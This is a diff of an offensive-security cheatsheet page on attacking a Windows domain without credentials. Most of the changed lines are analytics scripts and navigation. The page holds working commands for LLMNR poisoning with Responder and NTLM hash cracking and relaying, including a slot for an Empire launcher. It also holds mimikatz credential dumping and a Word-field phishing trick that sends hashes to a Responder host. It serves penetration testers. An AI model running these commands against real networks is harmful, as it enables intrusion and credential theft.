@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:52 CEST">
+<meta name="revised" content="2023-02-14T12:07:01 CET">
 <title>Out of Domain (No credentials) :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -67,6 +96,413 @@
       <a href="/open-source-intelligence-osint/">Open Source Intelligence (OSINT)</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
+    <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/open-source-intelligence-osint/tools-and-methodology/">Tools &amp; Methodology</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/methodology/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/methodology/">
+            Methodology
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/opsec/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/opsec/">
+            OPSEC
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/firefox_addons/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/firefox_addons/">
+            Firefox addons
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/buscador/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/buscador/">
+            Buscador
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+    <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/">Frameworks</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/recon-ng/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/recon-ng/">
+            Recon-ng
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/gasmask/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/gasmask/">
+            Gasmak
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/omnibus/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/omnibus/">
+            Omnibus
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/spiderfoot/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/spiderfoot/">
+            Spiderfoot
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/datasploit/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/datasploit/">
+            Datasploit
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/danger_zone/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/danger_zone/">
+            Danger Zone
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/recondog/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/recondog/">
+            ReconDog
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/osint-spy/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/osint-spy/">
+            OSINT-SPY
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/belati/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/belati/">
+            Belati
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/sn0int/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/sn0int/">
+            sn0int
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/photon/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/photon/">
+            Photon
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+        </ul>
+    </li>
+        </ul>
+    </li>
+    <li data-nav-id="/open-source-intelligence-osint/dorks/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/open-source-intelligence-osint/dorks/">Dorks</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+      <li data-nav-id="/open-source-intelligence-osint/dorks/google_dorks/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/dorks/google_dorks/">
+            Google Dorks
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/dorks/twitter_dorks/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/dorks/twitter_dorks/">
+            Twitter Dorks
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/dorks/github_dorks/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/dorks/github_dorks/">
+            Github Dorks
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+        </ul>
+    </li>
+    <li data-nav-id="/open-source-intelligence-osint/technical-recon/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/open-source-intelligence-osint/technical-recon/">Technical Investigation</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+      <li data-nav-id="/open-source-intelligence-osint/technical-recon/ip_address/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/technical-recon/ip_address/">
+            IP Address
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/technical-recon/domains_urls/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/technical-recon/domains_urls/">
+            Domain &amp; URLs
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/technical-recon/subdomain_discovery/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/technical-recon/subdomain_discovery/">
+            Subdomain Discovery
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+    <li data-nav-id="/open-source-intelligence-osint/technical-recon/misc/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/open-source-intelligence-osint/technical-recon/misc/">MISC</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+      <li data-nav-id="/open-source-intelligence-osint/technical-recon/misc/url_shortener/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/technical-recon/misc/url_shortener/">
+            URL Shortener &amp; Redirect
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/technical-recon/misc/darkweb_investigation/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/technical-recon/misc/darkweb_investigation/">
+            Darkweb Investigation
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/technical-recon/misc/cryptocurrency_investigation/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/technical-recon/misc/cryptocurrency_investigation/">
+            Cryptocurrency Investigation
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/technical-recon/misc/others/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/technical-recon/misc/others/">
+            Others
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+        </ul>
+    </li>
+        </ul>
+    </li>
+    <li data-nav-id="/open-source-intelligence-osint/company_investigations/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/open-source-intelligence-osint/company_investigations/">Company Investigations</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+      <li data-nav-id="/open-source-intelligence-osint/company_investigations/company_informations/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/company_investigations/company_informations/">
+            Information Gathering
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/company_investigations/wayback_machine/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/company_investigations/wayback_machine/">
+            Wayback Web Archive
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/company_investigations/documents_metadata/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/company_investigations/documents_metadata/">
+            Public Documents and Metadata
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+        </ul>
+    </li>
+    <li data-nav-id="/open-source-intelligence-osint/human-recon/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/open-source-intelligence-osint/human-recon/">Human Investigation</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/searchingsomeone/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/searchingsomeone/">
+            Searching Someone
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/email/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/email/">
+            E-mails
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/leaks/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/leaks/">
+            Credentials Leaks
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/username/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/username/">
+            Usernames
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/pictures/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/pictures/">
+            Picture Investigation
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/phone/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/phone/">
+            Phone
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/geolocation/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/geolocation/">
+            Geolocation &amp; GEOINT
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/misc/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/misc/">
+            MISC - Tips &amp; Tricks
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+        </ul>
+    </li>
+    <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/open-source-intelligence-osint/platforms-hunting/">Platforms Hunting</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/google/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/platforms-hunting/google/">
+            Google
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/linkedin/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/platforms-hunting/linkedin/">
+            LinkedIn
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/twitter/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/platforms-hunting/twitter/">
+            Twitter
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/facebook/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/platforms-hunting/facebook/">
+            Facebook
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/instagram/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/platforms-hunting/instagram/">
+            Instagram
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/snapchat/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/platforms-hunting/snapchat/">
+            Snapchat
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/tiktok/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/platforms-hunting/tiktok/">
+            TikTok
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/tinder/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/platforms-hunting/tinder/">
+            Tinder
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/github/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/platforms-hunting/github/">
+            Github
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/reddit/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/platforms-hunting/reddit/">
+            Reddit
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/tumblr/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/platforms-hunting/tumblr/">
+            Tumblr
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/amazon_digitalocean/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/platforms-hunting/amazon_digitalocean/">
+            Amazon &amp; Digital Ocean Buckets
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/parler/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/platforms-hunting/parler/">
+            Parler
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+        </ul>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/web-pentest/" class="dd-item haschildren
@@ -1416,9 +1852,7 @@
     
     
     
-    
-
-<h3 id="identification">Identification</h3>
+    <h3 id="identification">Identification</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Passiv network listening to identify machines</span>
 <span style="color:#75715e"># By default, it uses interactive mode (incompatible with clean output)</span>
 <span style="color:#75715e"># You can use the -P option to get off interactive</span>
@@ -1429,17 +1863,15 @@ sudo netdiscover -p -i eth0 -P
 dig -x IP
 
 <span style="color:#75715e"># If the NAC is blocking, you can listen broadcast and collect MAC address</span>
-<span style="color:#75715e"># Use printer&#39;s MAC address to bypass NAC</span></code></pre></div>
-<p><br/></p>
-
-<h3 id="llmnr-nbt-ns">LLMNR / NBT-NS</h3>
+<span style="color:#75715e"># Use printer&#39;s MAC address to bypass NAC</span>
+</code></pre></div><!-- raw HTML omitted -->
+<h3 id="llmnr--nbt-ns">LLMNR / NBT-NS</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># You can Man in The Middle using LLMNR and NBT-NS if they&#39;re bad configured</span>
 sudo responder -I eth0 -wFv
 
 <span style="color:#75715e"># If you get hashes, will be necessary to crack them</span>
-john --format<span style="color:#f92672">=</span>netntlmv2 --wordlist<span style="color:#f92672">=</span><span style="color:#d88200">&#34;/usr/share/wordlists/rockyou.txt&#34;</span> hash.txt </code></pre></div>
-<p><br/></p>
-
+john --format<span style="color:#f92672">=</span>netntlmv2 --wordlist<span style="color:#f92672">=</span><span style="color:#d88200">&#34;/usr/share/wordlists/rockyou.txt&#34;</span> hash.txt 
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="responder-and-multirelay">Responder and Multirelay</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># You can link responder and multi relay to own machines</span>
 
@@ -1451,20 +1883,20 @@ responder -I eth0 -rv
 responder -I &lt;interface&gt; -r -d -w
 
 <span style="color:#75715e"># All captured hashes are stored and can be retrieved using the DumpHash.py script</span>
-$ sudo python DumpHash.py</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># You can check for machines with disabled SMB Signing with RunFinger (impacket) or CrackMapExec</span>
-python RunFinger.py -i <span style="color:#ae81ff">10</span>.0.2.0/24
+$ sudo python DumpHash.py
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># You can check for machines with disabled SMB Signing with RunFinger (impacket) or CrackMapExec</span>
+python RunFinger.py -i 10.0.2.0/24
 cme smb &lt;CIDR&gt; --gen-relay-list targets.txt
 
 <span style="color:#75715e"># Then you will target one machine or one range for MultiRelay</span>
-python MultiRelay.py -t <span style="color:#ae81ff">10</span>.0.2.4 -u ALL
+python MultiRelay.py -t 10.0.2.4 -u ALL
 ntlmrelayx.py -tf targets.txt
 ntlmrelayx.py -tf targets.txt -c &lt;insert your Empire Powershell launcher here&gt;
 
 <span style="color:#75715e"># Then you can pop an interactive shell</span>
 <span style="color:#75715e"># And use for example mimikatz</span>
-mimi sekurlsa::logonpasswords</code></pre></div>
-<p><br/></p>
-
+mimi sekurlsa::logonpasswords
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="ntlm-relaying-and-proxychains">NTLM Relaying and Proxychains</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Using socks settings in case of multiple sessions to handle</span>
 <span style="color:#75715e"># you can specify a target like this all://10.1.2.10</span>
@@ -1486,9 +1918,8 @@ ntlmrelayx&gt; socks
 <span style="color:#75715e"># For example, connect through SMB</span>
 <span style="color:#75715e"># If password asked, whatever</span>
 proxychains smbclient //192.168.48.230/Users -U contoso/normaluser1
-proxychains ./mssqlclient.py contoso/normaluser1@192.168.48.230 -windows-auth</code></pre></div>
-<p><br/></p>
-
+proxychains ./mssqlclient.py contoso/normaluser1@192.168.48.230 -windows-auth
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="snmp-communities">SNMP Communities</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># You can use metasploit to enumerate known SNMP communities</span>
 auxiliary/scanner/snmp/snmp_enum
@@ -1500,27 +1931,26 @@ onesixtyone &lt;target&gt; public
 onesixtyone -c wordlist &lt;target&gt;
 
 <span style="color:#75715e"># Or you can use snmp-check</span>
-snmp-check -t <span style="color:#ae81ff">192</span>.168.1.2 -c public/private</code></pre></div>
-<p><br/></p>
-
+snmp-check -t 192.168.1.2 -c public/private
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="phishing-with-responder">Phishing with Responder</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Open Word -&gt; CTRL + F9</span>
 <span style="color:#75715e"># IMPORT &#34;\\\\Responder-IP\\1.jpg&#34;</span>
 <span style="color:#75715e"># Right click and select &#34;Edit Field&#34;</span>
 <span style="color:#75715e"># Tick &#34;Data not stored in document&#34;</span>
 <span style="color:#75715e"># Save &amp; close.</span>
-<span style="color:#75715e"># Open the document -&gt; free credentials :)</span></code></pre></div>
-<p><br/></p>
-
+<span style="color:#75715e"># Open the document -&gt; free credentials :)</span>
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="azure-ad-recon">Azure AD Recon</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html
 
 <span style="color:#75715e"># https://login.microsoftonline.com/getuserrealm.srf?login=username@gothamlab.onmicrosoft.com&amp;xml=1</span>
-<span style="color:#75715e"># If the NameSpaceType indicates &#34;Managed&#34;, then the company is using Azure AD.</span> 
+<span style="color:#75715e"># If the NameSpaceType indicates &#34;Managed&#34;, then the company is using Azure AD. </span>
 
 <span style="color:#75715e"># Discover accounts</span>
 <span style="color:#75715e"># o365creeper can be used, it does not produce logs on the AD side</span>
-https://github.com/LMGsec/o365creeper</code></pre></div>
+https://github.com/LMGsec/o365creeper
+</code></pre></div>
 
     
     
